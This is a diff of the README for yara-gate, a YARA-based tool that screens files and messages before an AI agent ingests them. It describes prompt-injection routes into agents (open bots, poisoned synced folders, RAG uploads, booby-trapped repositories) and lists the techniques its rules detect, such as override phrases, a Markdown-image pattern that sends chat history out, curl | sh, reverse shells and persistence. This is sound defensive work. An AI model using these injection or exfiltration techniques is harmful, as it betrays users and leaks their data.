@@ -24,7 +24,7 @@ These are supported ingestion patterns, not automatically installed connectors. 
 
 | Intake channel | What goes wrong | What the gate holds |
 | --- | --- | --- |
-| **An open phone number, Telegram bot, or webhook** | Anyone who has the number can write into the agent's context | Override phrases (8 languages plus English), role spoofing, requests for secrets, Markdown-image exfiltration (`![x](https://…?d={{chat_history}})`), invisible Unicode, look-alike spellings such as `Ignоre` with a Cyrillic о, and base64-wrapped instructions or executables. The body is scanned in memory, and the same buffer goes to the model |
+| **An open phone number, Telegram bot, or webhook** | Anyone who has the number can write into the agent's context | Override phrases (8 languages plus English), role spoofing, requests for secrets, Markdown-image exfiltration (`![x](https://…?d={{chat_history}})`), invisible Unicode, look-alike spellings such as `Ignоre` with a Cyrillic о, and base64- or percent-encoded instructions (including PowerShell's UTF-16LE form) or base64 executables. The body is scanned in memory, and the same buffer goes to the model |
 | **A synced corpus** (Dropbox, OneDrive, iCloud, `rclone`) | A shared-folder member or a compromised account drops a poisoned document, and the next reindex makes it retrievable for good | Hidden HTML instructions, PDF actions, Office macros, and DDE under either policy. Override phrases in entity- and JSON-escaped text, in sentences split across Word runs, in compressed PDF streams, and in the text a PDF shows (kerned, hex, or glyph-ID strings rejoined per text block, and per paragraph when bold or a wrap splits it) are held under `agent-ingest` (use it for folders other people can write to); `agent-document` records them as notes and reads the file. Encrypted PDFs and Office files are held as **incomplete** rather than passed unread. A PDF font whose glyph IDs have no `ToUnicode` map is a note, so unread text is held under `agent-ingest`; gate the extracted text too |
 | **New RAG or upload files** | A "report" whose real reader is the model | The same document views, plus checks for file-type mismatches, double extensions, and control characters in file names |
 | **A cloned repository** | A `.vscode/tasks.json` that runs on folder open (the fake job-interview lure), `curl \| sh`, reverse shells, persistence | `dev_vscode_autorun_task`, download-and-execute, reverse-shell, Gatekeeper and Defender tampering, and LaunchAgent and sudoers persistence rules |
@@ -132,13 +132,13 @@ Intake accepts only a regular file with one link and opens it without following 
 
 ## What this catches, and what it does not
 
-**Shipped:** 82 YARA rules in 57 files, grouped into these families:
-- **Agent ingestion:** override phrases in 9 languages, second-person orders to drop filters, swap persona, obey a spoofed authority, or plant a standing instruction in memory, role spoofing, fake chat markers, tool-output overrides, persistence requests, secret transfer, one-time-code relay requests in chat or SMS, Markdown exfiltration, hidden HTML, invisible and bidi Unicode, and base64 instructions or executables.
+**Shipped:** 84 YARA rules in 57 files, grouped into these families:
+- **Agent ingestion:** override phrases in 9 languages, second-person orders to drop filters, swap persona, obey a spoofed authority, or plant a standing instruction in memory, role spoofing, fake chat markers, tool-output overrides, persistence requests, secret transfer, one-time-code relay requests in chat or SMS, Markdown exfiltration, hidden HTML, invisible and bidi Unicode, and base64- or percent-encoded instructions, which the lexical rules read in decoded views, or base64 executables.
 - **Windows delivery:** ClickFix, HTML smuggling, encoded PowerShell, `mshta`, `regsvr32`, and `rundll32`, plus shortcut, `.url`, `.library-ms`, `search-ms`, `.rdp`, and `.theme` NTLM leaks.
 - **Windows script hosts and documents:** HTA, WSF, MSC, `.reg` Run keys, encoded scripts, OneNote, CSV, SYLK, and IQY formulas, LOLBin downloads, MSBuild inline tasks that load code, `cmstp` INF scriptlets, and Chromium password decryption.
 - **Windows defense evasion:** Defender tampering, AMSI bypass, and deleting shadow copies.
 - **macOS and Linux:** AMOS-style password prompts and `dscl` password checks next to browser or wallet stores, JXA that runs fetched code, keychain dumps, Gatekeeper and quarantine bypass, archive-and-upload exfiltration, `.desktop` launchers, and sudoers, `ld.so.preload`, and TCC persistence.
-- **Cross-platform:** reverse shells, credential files piped or attached to an upload, VS Code folder-open tasks, project settings that turn off a coding agent's approval prompts, AI CLIs run with approval off to hunt for wallets and keys, and Python `.pth` files that run code at interpreter start.
+- **Cross-platform:** reverse shells, credential files piped or attached to an upload, VS Code folder-open tasks, git config keys that run a fetched or inline command (`core.fsmonitor`, `sshCommand`, pagers, filter drivers, temp-folder `hooksPath`), dev container lifecycle commands, direnv `.envrc` files that download or decode, project settings that turn off a coding agent's approval prompts, AI CLIs run with approval off to hunt for wallets and keys, and Python `.pth` files that run code at interpreter start.
 - **GitHub Actions:** planted workflows that dump every secret with `toJSON(secrets)` to the network or an artifact (Shai-Hulud), or run discussion or issue text on a self-hosted runner (Shai-Hulud 2.0's `discussion.yaml`).
 - **Documents and containers:** RTF objects, active SVG, external OOXML and RTF templates, and disk images.
 
@@ -146,7 +146,7 @@ Intake accepts only a regular file with one link and opens it without following 
 
 **Vendor packs**, downloaded once by `yara-gate setup` (or `rules install --allow-network`): YARA Forge core, signature-base, and Elastic protections-artifacts. See the dated [vendor census](docs/verification/2026-11-01-ecosystem-rules.md) and [grading verification](docs/verification/2026-11-01-vendor-setup.md) for measured coverage and skips. Their matches block unless the reviewed [override list](#how-vendor-matches-are-graded) lowers or skips them.
 
-**Precision:** in the [documented 320-file synthetic corpus](docs/rules.md#measured-precision), 78 of the 82 rules hit nothing. The other four are documented Windows collisions, each at 0.31%. This is a synthetic corpus, not a production false-positive rate.
+**Precision:** in the [documented 324-file synthetic corpus](docs/rules.md#measured-precision), 80 of the 84 rules hit nothing. The other four are documented Windows collisions, each at 0.31%. This is a synthetic corpus, not a production false-positive rate.
 
 **What it does not do:**
 - It cannot guarantee detection of novel or targeted payloads. YARA matches patterns someone has already written down, and the gate never builds a rule from the file it is judging.
@@ -216,7 +216,7 @@ uv run python docs/research/probe_rule_coverage.py --verify   # real library and
 src/yara_gate/       cli, scanner, content (archives, mail, views), filetype, heuristics,
                      models, quarantine, report, rules, hunt, demo, selftest, samples,
                      launchd, release (reviewed-release building blocks, not yet a command)
-rules/local/         the 82 shipped rules in 57 files; rules/rules.lock pins the vendor packs
+rules/local/         the 84 shipped rules in 57 files; rules/rules.lock pins the vendor packs
 web-demo/            public recorded-demo assets; scripts/ builds and re-records them;
                      docs/pages-demo.md explains deployment
 screenshots/         original captures and provenance; user-guide.md covers operation
